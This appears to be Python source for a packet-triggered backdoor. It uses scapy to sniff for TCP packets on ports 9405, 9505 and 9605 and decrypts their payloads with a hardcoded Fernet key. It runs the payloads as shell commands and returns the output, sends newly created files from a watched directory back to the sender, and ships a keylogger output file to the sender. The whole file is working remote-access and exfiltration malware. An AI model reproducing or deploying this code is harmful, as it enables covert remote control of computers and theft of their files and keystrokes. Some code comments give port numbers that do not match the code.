import sys,os, subprocess, time
import socket
from multiprocessing import Queue
from scapy.all import *
from cryptography.fernet import Fernet


TCP_IP = ''
TCP_PORT = 8045
TCP_EXFIL=8046
TCP_KEY=8047
key = b'EzBmzsJH6VogpmXpxI-bJS8xXgXMGgC2T_How8q24_w='
host=''

pcap_filter="tcp[tcpflags] & (tcp-ack)==0 && (tcp dst port 9405 ||tcp dst port 9505||tcp dst port 9605)"

def decryptmsg(crypt):
	#print(crypt)
	if not crypt: 
		print("Blank received") 
	else:
		f=Fernet(key)
		token=f.decrypt(crypt)
		return token

def encryptmsg(crypt):
	f=Fernet(key)
	token=f.encrypt(crypt.encode())
	return token

def exfil(pkt):
	global host
	#print("In Exfil")
	#print("path received")
	path=decryptmsg(pkt[Raw].load).decode()
	before = dict ([(f, None) for f in os.listdir (path)])
	ip=pkt[IP].src
	while 1:
		time.sleep (10)
		after = dict ([(f, None) for f in os.listdir (path)])
		added = [f for f in after if not f in before]
		removed = [f for f in before if not f in after]
		if added: 
			#print( "Added: ", ", ".join (added))
			exfilsend(path + "\\" + added[0], ip)
			break
		#if removed: print( "Removed: ", ", ".join (removed))
		before = after
def exfilsend(added, host):
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,TCP_EXFIL))
	with open (added, 'rb') as f:
		l = f.read(1024)
		while (l):
			s.send(l)
			l = f.read(1024)
	s.close()


def keylogger(host):
	#print("In Keylog")
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,TCP_KEY))
	#print("sending log")
	efile='c:\\output.txt'
	f = open (efile, "rb")
	l = f.read(1024)
	while (l):
		s.send(l)
		l = f.read(1024)
	s.close()
	#print("sent! back to sniffing")
    #send keylog file log_file to client
    

def kill_backdoor():
    print("Killing backdoor")

def kill_client():
    print("Killing client")

def backdoorcmd(pkt):
	#print("In backdoor")
	data=decryptmsg(pkt[Raw].load).decode()
	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #This command runs processes. 
	stdoutput = proc.stdout.read() + proc.stderr.read()
	edata=encryptmsg(stdoutput.decode())
	sendpkt(edata,pkt.getlayer(TCP).dport,pkt.getlayer(TCP).sport,pkt.getlayer(IP).src)

def sendpkt(data, sport, dport, server):	
	####craft packet####
	pkt=IP()/TCP()/Raw()
	pkt.getlayer(IP).dst=server
	pkt.getlayer(TCP).sport=sport
	pkt.getlayer(TCP).dport=dport
	pkt.getlayer(Raw).load=data.strip()
	#ls(pkt)
	send(pkt, verbose=False)
	
	
def RecevePackets(pkt):
	#check if the packet is for the backdoor, exfil, keylog
	#print ("packet received")
	ip=pkt[IP].src
	time.sleep(2)
	if pkt.haslayer(TCP):
		if pkt.getlayer(TCP).dport==9405: #if port is 8405 it is for backdoor. execute the command and send back the output and listen for further commands
			if pkt[TCP].seq == 1048577:
				#ip=pkt[IP].src
				#UndoKnock(ip)
				Bflag="a"
			else :
				backdoorcmd(pkt)
		if pkt.getlayer(TCP).dport==9505: #if port is 8505 it is for exfil. monitor the directory and send any new files back to client and listen for further commands
			exfil(pkt)
		if pkt.getlayer(TCP).dport==9605:#if port is 8605 it is for keylogger. send keylog file from path set above and listen for further commands
			keylogger(ip)

sniff(filter=pcap_filter,prn=RecevePackets)
